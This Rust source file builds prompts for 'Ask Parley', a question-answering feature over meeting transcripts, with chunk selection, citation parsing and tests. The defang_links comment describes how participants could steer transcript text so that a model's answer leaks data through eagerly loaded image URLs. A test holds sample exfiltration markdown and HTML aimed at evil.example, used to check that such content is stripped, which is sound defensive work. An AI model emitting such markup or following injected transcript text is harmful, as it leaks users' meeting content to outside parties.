//! Prompt construction for "Ask Parley" — pure functions, no I/O.
//!
//! The context is the meeting's summary, its notes, the prior chat turns and
//! the speaker-attributed transcript as `[mm:ss] Speaker: text` lines. When
//! that doesn't fit the model's window, the transcript is cut into chunks of
//! consecutive segments and only the chunks sharing the most keywords with
//! the question (and the previous question, for follow-ups) are kept, in
//! chronological order with `…` marking the gaps.
//!
//! Token counts use the summary processor's deliberately pessimistic
//! [`rough_token_count`], so an estimate that fits really fits.

use crate::summary::processor::rough_token_count;
use once_cell::sync::Lazy;
use regex::Regex;
use std::collections::{HashMap, HashSet};

/// Prior messages (user + assistant) carried into the prompt.
pub const MAX_HISTORY_MESSAGES: usize = 12;
/// Per-message cap on a history turn, in characters.
const MAX_HISTORY_MESSAGE_CHARS: usize = 2_000;
/// Target size of one transcript chunk for relevance selection, in characters.
pub const CHUNK_CHARS: usize = 1_500;
/// Fixed allowance for the prompt's own scaffolding (headings, tags).
const SCAFFOLD_TOKENS: usize = 150;

/// What the model is told to do. Kept short — small local models follow a
/// few clear rules better than many.
pub const SYSTEM_PROMPT: &str = "You are Parley, an assistant that answers questions about one recorded meeting. \
You are given the meeting's transcript (each line is `[mm:ss] Speaker: text`), and possibly its summary, \
the user's notes and the conversation so far.\n\
Rules:\n\
- Answer concisely and directly. Use short paragraphs or bullet points.\n\
- Ground every claim in the transcript and cite the moment it was said with its timestamp exactly as written, e.g. [12:34]. Cite several timestamps when relevant.\n\
- If the transcript does not contain the answer, say so plainly (for example \"The transcript doesn't say.\") instead of guessing.\n\
- When asked to draft something (an email, a reply, a list of follow-ups), base it only on what was said in the meeting.\n\
- Refer to people by the speaker names used in the transcript.";

/// Repeated after the question: small local models weigh the end of a long
/// prompt most, and without this they tend to drop the citations.
pub const ANSWER_REMINDER: &str = "Answer concisely. Cite the transcript timestamp for each point, e.g. [12:34]. \
If the transcript doesn't contain the answer, say so.";

/// One transcript segment, reduced to what the chat context needs.
#[derive(Debug, Clone, PartialEq)]
pub struct ContextSegment {
    /// Recording-relative start time in seconds, if known.
    pub start: Option<f64>,
    pub speaker: String,
    pub text: String,
}

/// A prior chat turn.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChatTurn {
    pub is_user: bool,
    pub content: String,
}

/// Everything about the meeting that can go into the prompt.
#[derive(Debug, Clone, Default)]
pub struct MeetingContext {
    pub title: String,
    pub summary: Option<String>,
    pub notes: Vec<String>,
    pub segments: Vec<ContextSegment>,
}

/// How much of the transcript made it into the prompt.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TranscriptCoverage {
    Full,
    /// Only `selected` of `total` chunks, chosen by keyword relevance.
    Excerpts { selected: usize, total: usize },
    Empty,
}

#[derive(Debug, Clone)]
pub struct BuiltPrompt {
    pub system: String,
    pub user: String,
    pub coverage: TranscriptCoverage,
}

/// `[mm:ss]` for a recording-relative time. Minutes are not wrapped into
/// hours (`[75:03]`), matching the transcript panel's own timestamps.
pub fn format_timestamp(seconds: f64) -> String {
    let total = if seconds.is_finite() && seconds > 0.0 {
        seconds.floor() as u64
    } else {
        0
    };
    format!("[{:02}:{:02}]", total / 60, total % 60)
}

/// One transcript line as the model sees it.
pub fn segment_line(segment: &ContextSegment) -> String {
    let text = segment.text.trim();
    match segment.start {
        Some(start) => format!("{} {}: {}", format_timestamp(start), segment.speaker, text),
        None => format!("{}: {}", segment.speaker, text),
    }
}

/// A run of consecutive segments, rendered.
#[derive(Debug, Clone, PartialEq)]
pub struct TranscriptChunk {
    /// Index of the first segment in the chunk.
    pub first_segment: usize,
    pub text: String,
}

/// Group consecutive segments into chunks of roughly `max_chars`. A single
/// segment longer than `max_chars` becomes its own chunk (never split
/// mid-sentence — its timestamp must stay attached to its words).
pub fn chunk_segments(segments: &[ContextSegment], max_chars: usize) -> Vec<TranscriptChunk> {
    let mut chunks = Vec::new();
    let mut current = String::new();
    let mut first = 0;
    for (ix, segment) in segments.iter().enumerate() {
        if segment.text.trim().is_empty() {
            continue;
        }
        let line = segment_line(segment);
        if !current.is_empty() && current.len() + 1 + line.len() > max_chars {
            chunks.push(TranscriptChunk {
                first_segment: first,
                text: std::mem::take(&mut current),
            });
        }
        if current.is_empty() {
            first = ix;
        } else {
            current.push('\n');
        }
        current.push_str(&line);
    }
    if !current.is_empty() {
        chunks.push(TranscriptChunk {
            first_segment: first,
            text: current,
        });
    }
    chunks
}

static STOPWORDS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    [
        "the", "and", "for", "are", "but", "not", "you", "all", "any", "can", "had", "her", "was",
        "one", "our", "out", "has", "have", "him", "his", "how", "its", "may", "new", "now", "old",
        "see", "two", "who", "did", "does", "get", "got", "let", "say", "said", "she", "too", "use",
        "that", "this", "with", "from", "they", "them", "then", "than", "what", "when", "where",
        "which", "while", "will", "would", "could", "should", "there", "their", "about", "into",
        "over", "were", "been", "being", "some", "such", "just", "like", "also", "very", "much",
        "more", "most", "only", "your", "yours", "mine", "ours", "here", "these", "those", "why",
        "yes", "yeah", "okay", "really", "think", "know", "going", "want", "meeting", "tell",
        "talk", "talked", "discuss", "discussed", "please", "anything", "something", "thing",
        "things", "make", "made", "well", "right", "good", "kind", "sort", "lot", "gonna",
    ]
    .into_iter()
    .collect()
});

/// Lower-cased content words: alphanumeric runs of 3+ characters that aren't
/// stopwords, with a trailing plural `s` dropped so "budgets" meets "budget".
pub fn keywords(text: &str) -> Vec<String> {
    text.split(|c: char| !c.is_alphanumeric())
        .filter(|w| w.chars().count() >= 3)
        .map(|w| w.to_lowercase())
        .filter(|w| !STOPWORDS.contains(w.as_str()))
        .map(|w| normalize_word(&w))
        .collect()
}

fn normalize_word(word: &str) -> String {
    if word.len() > 4 && word.ends_with('s') && !word.ends_with("ss") {
        word[..word.len() - 1].to_string()
    } else {
        word.to_string()
    }
}

/// Pick chunks to fill `budget_tokens`, most relevant to `query` first, and
/// return their indices in chronological order.
///
/// Relevance is keyword overlap weighted by rarity (an IDF-style
/// `ln(1 + n/df)` per distinct query term present), so a rare project name
/// outweighs a word every chunk contains. When nothing matches at all (a
/// vague "what happened?"), chunks are sampled evenly across the meeting
/// instead of just taking the opening minutes.
pub fn select_relevant_chunks(
    chunks: &[TranscriptChunk],
    query: &str,
    budget_tokens: usize,
) -> Vec<usize> {
    if chunks.is_empty() || budget_tokens == 0 {
        return Vec::new();
    }
    let costs: Vec<usize> = chunks.iter().map(|c| rough_token_count(&c.text) + 1).collect();

    let query_terms: HashSet<String> = keywords(query).into_iter().collect();
    let chunk_terms: Vec<HashSet<String>> = chunks
        .iter()
        .map(|c| keywords(&c.text).into_iter().collect())
        .collect();
    let mut df: HashMap<&str, usize> = HashMap::new();
    for term in &query_terms {
        let count = chunk_terms.iter().filter(|t| t.contains(term)).count();
        df.insert(term.as_str(), count);
    }
    let n = chunks.len() as f64;
    let scores: Vec<f64> = chunk_terms
        .iter()
        .map(|terms| {
            query_terms
                .iter()
                .filter(|q| terms.contains(*q))
                .map(|q| (1.0 + n / df[q.as_str()].max(1) as f64).ln())
                .sum()
        })
        .collect();

    let order: Vec<usize> = if scores.iter().all(|s| *s <= 0.0) {
        even_spread_order(chunks.len())
    } else {
        let mut order: Vec<usize> = (0..chunks.len()).collect();
        // Highest score first; ties go to the earlier chunk.
        order.sort_by(|&a, &b| {
            scores[b]
                .partial_cmp(&scores[a])
                .unwrap_or(std::cmp::Ordering::Equal)
                .then(a.cmp(&b))
        });
        // Matching chunks only; fill leftover space with spread context.
        let matched: Vec<usize> = order.into_iter().filter(|&ix| scores[ix] > 0.0).collect();
        let mut seen: HashSet<usize> = matched.iter().copied().collect();
        let mut full = matched;
        for ix in even_spread_order(chunks.len()) {
            if seen.insert(ix) {
                full.push(ix);
            }
        }
        full
    };

    let mut used = 0usize;
    let mut picked = Vec::new();
    for ix in order {
        if used + costs[ix] <= budget_tokens {
            used += costs[ix];
            picked.push(ix);
        }
    }
    picked.sort_unstable();
    picked
}

/// Visit order that covers `[0, n)` coarse-to-fine: first, last, middle,
/// quarters, eighths… so any prefix of it is spread across the meeting.
fn even_spread_order(n: usize) -> Vec<usize> {
    let mut order = Vec::with_capacity(n);
    let mut seen = vec![false; n];
    let mut push = |ix: usize, order: &mut Vec<usize>| {
        if ix < n && !seen[ix] {
            seen[ix] = true;
            order.push(ix);
        }
    };
    if n == 0 {
        return order;
    }
    push(0, &mut order);
    push(n - 1, &mut order);
    let mut parts = 2;
    while order.len() < n {
        for k in (1..parts).step_by(2) {
            push(k * (n - 1) / parts, &mut order);
        }
        parts *= 2;
        if parts > 2 * n {
            for ix in 0..n {
                push(ix, &mut order);
            }
        }
    }
    order
}

/// Truncate `text` to roughly `max_tokens`, on a char boundary, marking the cut.
pub fn truncate_to_tokens(text: &str, max_tokens: usize) -> String {
    if rough_token_count(text) <= max_tokens {
        return text.to_string();
    }
    let mut out = String::new();
    let mut used = 0.0f64;
    let limit = max_tokens.saturating_sub(2) as f64;
    for c in text.chars() {
        let cost = if c.is_ascii() { 0.35 } else { 1.0 };
        if used + cost > limit {
            break;
        }
        used += cost;
        out.push(c);
    }
    out.push_str(" …");
    out
}

/// Build the system and user prompts for one question.
///
/// `context_tokens` is the model's usable window (what
/// `LlmConfig::token_threshold` reports). Part of it is reserved for the
/// answer; history and the summary/notes are capped at a quarter of the rest
/// each, and the transcript gets everything left — in full when it fits,
/// otherwise as the most relevant excerpts.
pub fn build_prompt(
    meeting: &MeetingContext,
    history: &[ChatTurn],
    question: &str,
    context_tokens: usize,
) -> BuiltPrompt {
    let question = question.trim();
    let answer_reserve = (context_tokens / 8).clamp(256, 2_048);
    let fixed = rough_token_count(SYSTEM_PROMPT)
        + rough_token_count(ANSWER_REMINDER)
        + rough_token_count(question)
        + SCAFFOLD_TOKENS;
    let available = context_tokens.saturating_sub(answer_reserve + fixed);

    // -- Conversation so far: newest turns win.
    let history_budget = available / 4;
    let mut history_lines: Vec<String> = Vec::new();
    let mut history_tokens = 0usize;
    for turn in history.iter().rev().take(MAX_HISTORY_MESSAGES) {
        let content = truncate_chars(turn.content.trim(), MAX_HISTORY_MESSAGE_CHARS);
        let line = format!(
            "{}: {}",
            if turn.is_user { "User" } else { "Assistant" },
            content
        );
        let cost = rough_token_count(&line) + 1;
        if history_tokens + cost > history_budget {
            break;
        }
        history_tokens += cost;
        history_lines.push(line);
    }
    history_lines.reverse();

    // -- Summary + notes, capped together.
    let extras_budget = available / 4;
    let notes_text = meeting
        .notes
        .iter()
        .map(|n| n.trim())
        .filter(|n| !n.is_empty())
        .map(|n| format!("- {n}"))
        .collect::<Vec<_>>()
        .join("\n");
    let notes_text = truncate_to_tokens(&notes_text, extras_budget / 3);
    let summary_text = meeting
        .summary
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(|s| {
            truncate_to_tokens(
                s,
                extras_budget.saturating_sub(rough_token_count(&notes_text)),
            )
        });
    let extras_tokens =
        rough_token_count(&notes_text) + summary_text.as_deref().map_or(0, rough_token_count);

    // -- Transcript: whatever remains.
    let transcript_budget = available.saturating_sub(history_tokens + extras_tokens);
    let full_lines: Vec<String> = meeting
        .segments
        .iter()
        .filter(|s| !s.text.trim().is_empty())
        .map(segment_line)
        .collect();
    let full_transcript = full_lines.join("\n");

    let (transcript, coverage) = if full_lines.is_empty() {
        (String::new(), TranscriptCoverage::Empty)
    } else if rough_token_count(&full_transcript) <= transcript_budget {
        (full_transcript, TranscriptCoverage::Full)
    } else {
        let chunks = chunk_segments(&meeting.segments, CHUNK_CHARS);
        // The previous question carries the topic of a follow-up ("and who
        // owns that?") that the new one only refers to.
        let mut query = question.to_string();
        if let Some(prev) = history.iter().rev().find(|t| t.is_user) {
            query.push(' ');
            query.push_str(&prev.content);
        }
        let picked = select_relevant_chunks(&chunks, &query, transcript_budget);
        let mut text = String::new();
        let mut last: Option<usize> = None;
        for &ix in &picked {
            let gap = match last {
                None => ix > 0,
                Some(prev) => ix > prev + 1,
            };
            if gap {
                text.push_str("…\n");
            }
            text.push_str(&chunks[ix].text);
            text.push('\n');
            last = Some(ix);
        }
        if last.is_some_and(|l| l + 1 < chunks.len()) {
            text.push_str("…\n");
        }
        (
            text.trim_end().to_string(),
            TranscriptCoverage::Excerpts {
                selected: picked.len(),
                total: chunks.len(),
            },
        )
    };

    // -- Assemble.
    let mut user = String::new();
    let title = meeting.title.trim();
    if !title.is_empty() {
        user.push_str(&format!("Meeting: {title}\n\n"));
    }
    if let Some(summary) = &summary_text {
        user.push_str(&format!("<summary>\n{summary}\n</summary>\n\n"));
    }
    if !notes_text.is_empty() {
        user.push_str(&format!("<notes>\n{notes_text}\n</notes>\n\n"));
    }
    match &coverage {
        TranscriptCoverage::Full => {
            user.push_str(&format!("<transcript>\n{transcript}\n</transcript>\n\n"));
        }
        TranscriptCoverage::Excerpts { .. } => {
            user.push_str(
                "<transcript>\n(The full transcript is too long; these are the parts most relevant \
                 to the question. \"…\" marks omitted stretches. If the answer may be in an omitted \
                 part, say so.)\n",
            );
            user.push_str(&transcript);
            user.push_str("\n</transcript>\n\n");
        }
        TranscriptCoverage::Empty => {
            user.push_str("<transcript>\n(This meeting has no transcript.)\n</transcript>\n\n");
        }
    }
    if !history_lines.is_empty() {
        user.push_str(&format!(
            "<conversation>\n{}\n</conversation>\n\n",
            history_lines.join("\n")
        ));
    }
    user.push_str(&format!("Question: {question}\n\n{ANSWER_REMINDER}"));

    BuiltPrompt {
        system: SYSTEM_PROMPT.to_string(),
        user,
        coverage,
    }
}

fn truncate_chars(text: &str, max_chars: usize) -> String {
    if text.chars().count() <= max_chars {
        text.to_string()
    } else {
        let mut out: String = text.chars().take(max_chars).collect();
        out.push_str(" …");
        out
    }
}

/// A piece of an answer: plain text, or a `[mm:ss]` citation.
#[derive(Debug, Clone, PartialEq)]
pub enum AnswerSpan {
    Text(String),
    /// `label` is the citation as written (brackets included); `seconds` is
    /// its start time.
    Citation { label: String, seconds: f64 },
}

static CITATION_RE: Lazy<Regex> = Lazy::new(|| {
    // [mm:ss], [h:mm:ss], and ranges like [12:34-13:10] / [12:34–13:10]
    // (cited by their start).
    Regex::new(
        r"\[(?:(\d{1,2}):)?(\d{1,3}):([0-5]\d)(?:\s*[-–]\s*(?:\d{1,2}:)?\d{1,3}:[0-5]\d)?\]",
    )
    .expect("valid citation regex")
});

/// Split an answer into text and timestamp citations, so the UI can make
/// the citations clickable.
pub fn parse_citations(answer: &str) -> Vec<AnswerSpan> {
    let mut spans = Vec::new();
    let mut last = 0;
    for caps in CITATION_RE.captures_iter(answer) {
        let whole = caps.get(0).expect("match");
        let hours: f64 = caps.get(1).map_or(0.0, |m| m.as_str().parse().unwrap_or(0.0));
        let minutes: f64 = caps[2].parse().unwrap_or(0.0);
        let secs: f64 = caps[3].parse().unwrap_or(0.0);
        if whole.start() > last {
            spans.push(AnswerSpan::Text(answer[last..whole.start()].to_string()));
        }
        spans.push(AnswerSpan::Citation {
            label: whole.as_str().to_string(),
            seconds: hours * 3600.0 + minutes * 60.0 + secs,
        });
        last = whole.end();
    }
    if last < answer.len() {
        spans.push(AnswerSpan::Text(answer[last..].to_string()));
    }
    spans
}

/// URL scheme of the links [`link_citations`] produces.
pub const CITATION_LINK_SCHEME: &str = "parley-time:";

/// Rewrite every `[mm:ss]` citation in a markdown answer as a link
/// (`[\[12:34\]](parley-time:754)`), so a markdown renderer shows it as a
/// clickable link the UI can intercept. The visible text is unchanged.
pub fn link_citations(answer: &str) -> String {
    parse_citations(&defang_links(answer))
        .into_iter()
        .map(|span| match span {
            AnswerSpan::Text(text) => text,
            AnswerSpan::Citation { label, seconds } => format!(
                "[{}]({CITATION_LINK_SCHEME}{})",
                label.replace('[', "\\[").replace(']', "\\]"),
                seconds as u64
            ),
        })
        .collect()
}

static IMAGE_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"!\[([^\]]*)\]\s*(\([^)]*\)|\[[^\]]*\])").unwrap());
static LINK_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"\[([^\]]+)\]\s*\([^)]*\)").unwrap());
static LINK_DEF_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?m)^ {0,3}\[[^\]]+\]:.*$").unwrap());
static TAG_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"<([A-Za-z/!])").unwrap());

/// Strip everything in a model answer that could reach the network: images
/// (rendered eagerly, so a URL carrying transcript text would leak it with
/// no click), inline and reference links, and raw HTML / autolinks. The
/// answer is built from transcript text, which anyone in the meeting can
/// steer, so it's treated as untrusted markup. Link text is kept; only
/// `[mm:ss]` citations become links again in [`link_citations`].
pub fn defang_links(answer: &str) -> String {
    let s = IMAGE_RE.replace_all(answer, "$1");
    let s = LINK_RE.replace_all(&s, "$1");
    let s = LINK_DEF_RE.replace_all(&s, "");
    TAG_RE.replace_all(&s, "\\<$1").into_owned()
}

/// The time (seconds) a [`link_citations`] link points at, if `url` is one.
pub fn citation_link_seconds(url: &str) -> Option<f64> {
    url.strip_prefix(CITATION_LINK_SCHEME)?
        .parse::<u64>()
        .ok()
        .map(|s| s as f64)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn answers_cannot_carry_images_or_external_links() {
        let hostile = "Done [12:34]. ![x](https://evil.example/?q=secret) \
see [docs](https://evil.example/a) <img src=\"https://evil.example/i\"> \
<https://evil.example/auto> ![r][ref]\n[ref]: https://evil.example/r";
        let linked = link_citations(hostile);
        assert!(!linked.contains("evil.example/?q"), "{linked}");
        assert!(!linked.contains("](https://"), "{linked}");
        assert!(!linked.contains("[ref]: "), "{linked}");
        // Raw HTML and autolinks are escaped, so they render as text.
        assert!(linked.contains("\\<img") && !linked.contains(" <img"), "{linked}");
        assert!(linked.contains("\\<https") && !linked.contains(" <https"), "{linked}");
        assert!(linked.contains("see docs"), "{linked}");
        // The citation is still a link.
        assert!(linked.contains(&format!("({CITATION_LINK_SCHEME}754)")), "{linked}");
    }

    fn seg(start: f64, speaker: &str, text: &str) -> ContextSegment {
        ContextSegment {
            start: Some(start),
            speaker: speaker.to_string(),
            text: text.to_string(),
        }
    }

    fn turn(is_user: bool, content: &str) -> ChatTurn {
        ChatTurn {
            is_user,
            content: content.to_string(),
        }
    }

    #[test]
    fn formats_timestamps() {
        assert_eq!(format_timestamp(0.0), "[00:00]");
        assert_eq!(format_timestamp(754.9), "[12:34]");
        assert_eq!(format_timestamp(4503.0), "[75:03]");
        assert_eq!(format_timestamp(f64::NAN), "[00:00]");
        assert_eq!(format_timestamp(-3.0), "[00:00]");
    }

    #[test]
    fn segment_lines_carry_speaker_and_time() {
        assert_eq!(segment_line(&seg(65.0, "Alice", " Hi all ")), "[01:05] Alice: Hi all");
        let untimed = ContextSegment {
            start: None,
            speaker: "Bob".into(),
            text: "hello".into(),
        };
        assert_eq!(segment_line(&untimed), "Bob: hello");
    }

    #[test]
    fn small_meeting_gets_full_transcript_summary_notes_and_history() {
        let meeting = MeetingContext {
            title: "Budget sync".into(),
            summary: Some("We agreed the Q3 budget.".into()),
            notes: vec!["Check with finance".into(), "  ".into()],
            segments: vec![
                seg(5.0, "Alice", "Let's review the budget."),
                seg(12.0, "Bob", "Q3 is approved."),
                seg(20.0, "Bob", "   "),
            ],
        };
        let history = vec![turn(true, "Who is Bob?"), turn(false, "A participant [00:12].")];
        let prompt = build_prompt(&meeting, &history, "  What was approved? ", 8_000);

        assert_eq!(prompt.coverage, TranscriptCoverage::Full);
        assert_eq!(prompt.system, SYSTEM_PROMPT);
        let u = &prompt.user;
        assert!(u.contains("Meeting: Budget sync"));
        assert!(u.contains("<summary>\nWe agreed the Q3 budget.\n</summary>"));
        assert!(u.contains("<notes>\n- Check with finance\n</notes>"));
        assert!(u.contains("[00:05] Alice: Let's review the budget.\n[00:12] Bob: Q3 is approved."));
        assert!(!u.contains("[00:20]"), "blank segments are dropped");
        assert!(u.contains("<conversation>\nUser: Who is Bob?\nAssistant: A participant [00:12].\n</conversation>"));
        assert!(u.ends_with(&format!("Question: What was approved?\n\n{ANSWER_REMINDER}")));
        // Order: summary, notes, transcript, conversation, question.
        let pos = |s: &str| u.find(s).unwrap();
        assert!(pos("<summary>") < pos("<notes>"));
        assert!(pos("<notes>") < pos("<transcript>"));
        assert!(pos("<transcript>") < pos("<conversation>"));
    }

    #[test]
    fn empty_meeting_says_so() {
        let prompt = build_prompt(&MeetingContext::default(), &[], "anything?", 4_000);
        assert_eq!(prompt.coverage, TranscriptCoverage::Empty);
        assert!(prompt.user.contains("no transcript"));
        assert!(!prompt.user.contains("<summary>"));
        assert!(!prompt.user.contains("<conversation>"));
    }

    #[test]
    fn history_keeps_newest_turns_within_cap() {
        let history: Vec<ChatTurn> = (0..30)
            .map(|i| turn(i % 2 == 0, &format!("message number {i}")))
            .collect();
        let prompt = build_prompt(&MeetingContext::default(), &history, "q", 50_000);
        assert!(prompt.user.contains("message number 29"));
        assert!(prompt.user.contains(&format!("message number {}", 30 - MAX_HISTORY_MESSAGES)));
        assert!(!prompt.user.contains(&format!(
            "message number {}",
            30 - MAX_HISTORY_MESSAGES - 1
        )));
    }

    #[test]
    fn long_meeting_falls_back_to_relevant_excerpts() {
        let mut segments = Vec::new();
        for i in 0..400 {
            segments.push(seg(
                i as f64 * 10.0,
                "Alice",
                "We spent a while going over general status updates and scheduling logistics.",
            ));
        }
        segments[250] = seg(2500.0, "Bob", "The zeppelin launch slips to November.");
        let meeting = MeetingContext {
            title: "Long".into(),
            segments,
            ..Default::default()
        };
        let prompt = build_prompt(&meeting, &[], "When is the zeppelin launch?", 3_000);
        match prompt.coverage {
            TranscriptCoverage::Excerpts { selected, total } => {
                assert!(selected > 0 && selected < total);
            }
            other => panic!("expected excerpts, got {other:?}"),
        }
        assert!(prompt.user.contains("[41:40] Bob: The zeppelin launch slips to November."));
        assert!(prompt.user.contains("…"));
        assert!(rough_token_count(&prompt.user) + rough_token_count(&prompt.system) < 3_000);
    }

    #[test]
    fn follow_up_uses_previous_question_for_relevance() {
        let mut segments = Vec::new();
        for i in 0..400 {
            segments.push(seg(i as f64 * 10.0, "Alice", "Routine chatter about nothing in particular here."));
        }
        segments[100] = seg(1000.0, "Carol", "Carol owns the zeppelin budget.");
        let meeting = MeetingContext {
            segments,
            ..Default::default()
        };
        let history = vec![turn(true, "Tell me about the zeppelin."), turn(false, "It slips.")];
        let prompt = build_prompt(&meeting, &history, "Who owns it?", 3_000);
        assert!(prompt.user.contains("Carol owns the zeppelin budget."));
    }

    #[test]
    fn chunking_groups_consecutive_segments() {
        let segments: Vec<ContextSegment> = (0..10)
            .map(|i| seg(i as f64, "S", &"x".repeat(40)))
            .collect();
        let chunks = chunk_segments(&segments, 120);
        // Each line is ~51 chars, so two fit per 120-char chunk.
        assert_eq!(chunks.len(), 5);
        assert_eq!(chunks[0].first_segment, 0);
        assert_eq!(chunks[1].first_segment, 2);
        assert!(chunks.iter().all(|c| c.text.lines().count() == 2));

        let huge = vec![seg(0.0, "S", &"y".repeat(500)), seg(1.0, "S", "short")];
        let chunks = chunk_segments(&huge, 100);
        assert_eq!(chunks.len(), 2, "an oversized segment stays whole in its own chunk");
    }

    #[test]
    fn keywords_drop_stopwords_and_plurals() {
        assert_eq!(
            keywords("What did they say about the Budgets, and Q3 roadmap?"),
            vec!["budget", "roadmap"]
        );
        assert_eq!(keywords("process"), vec!["process"]);
    }

    #[test]
    fn selection_prefers_rare_matching_terms_and_returns_chronological_order() {
        let chunk = |t: &str| TranscriptChunk {
            first_segment: 0,
            text: t.to_string(),
        };
        let chunks = vec![
            chunk("budget budget budget review"),
            chunk("general chatter"),
            chunk("budget for the zeppelin"),
            chunk("more general chatter"),
            chunk("budget again"),
        ];
        // Room for about two chunks: the zeppelin one (rare + common term)
        // is the first pick, then another "budget" chunk that still fits.
        let cost = rough_token_count("budget for the zeppelin") + 1;
        let picked = select_relevant_chunks(&chunks, "zeppelin budget", cost * 2);
        assert!(picked.contains(&2));
        assert_eq!(picked.len(), 2);
        assert!(picked.windows(2).all(|w| w[0] < w[1]));
    }

    #[test]
    fn selection_without_matches_spreads_across_meeting() {
        let chunks: Vec<TranscriptChunk> = (0..9)
            .map(|i| TranscriptChunk {
                first_segment: i,
                text: format!("filler text {i}"),
            })
            .collect();
        let cost = rough_token_count("filler text 0") + 1;
        let picked = select_relevant_chunks(&chunks, "unrelated", cost * 3);
        assert_eq!(picked, vec![0, 4, 8]);
        assert!(select_relevant_chunks(&chunks, "x", 0).is_empty());
        assert!(select_relevant_chunks(&[], "x", 100).is_empty());
    }

    #[test]
    fn even_spread_covers_everything_once() {
        for n in 0..40 {
            let mut order = even_spread_order(n);
            assert_eq!(order.len(), n);
            order.sort_unstable();
            assert_eq!(order, (0..n).collect::<Vec<_>>());
        }
    }

    #[test]
    fn truncation_marks_cut() {
        assert_eq!(truncate_to_tokens("short", 100), "short");
        let t = truncate_to_tokens(&"a".repeat(1_000), 50);
        assert!(t.ends_with(" …"));
        assert!(rough_token_count(&t) <= 51);
    }

    #[test]
    fn parses_citations() {
        let spans = parse_citations("Agreed at [12:34] and again [1:02:03], see [00:05–00:30].");
        assert_eq!(
            spans,
            vec![
                AnswerSpan::Text("Agreed at ".into()),
                AnswerSpan::Citation {
                    label: "[12:34]".into(),
                    seconds: 754.0
                },
                AnswerSpan::Text(" and again ".into()),
                AnswerSpan::Citation {
                    label: "[1:02:03]".into(),
                    seconds: 3723.0
                },
                AnswerSpan::Text(", see ".into()),
                AnswerSpan::Citation {
                    label: "[00:05–00:30]".into(),
                    seconds: 5.0
                },
                AnswerSpan::Text(".".into()),
            ]
        );
        assert_eq!(
            parse_citations("no refs [here] or [12:75]"),
            vec![AnswerSpan::Text("no refs [here] or [12:75]".into())]
        );
        assert!(parse_citations("").is_empty());
    }

    #[test]
    fn links_citations_for_markdown() {
        let linked = link_citations("- Ship Friday [12:34].\n- No date [here].");
        assert_eq!(
            linked,
            "- Ship Friday [\\[12:34\\]](parley-time:754).\n- No date [here]."
        );
        assert_eq!(citation_link_seconds("parley-time:754"), Some(754.0));
        assert_eq!(citation_link_seconds("https://example.com"), None);
        assert_eq!(citation_link_seconds("parley-time:abc"), None);
    }
}
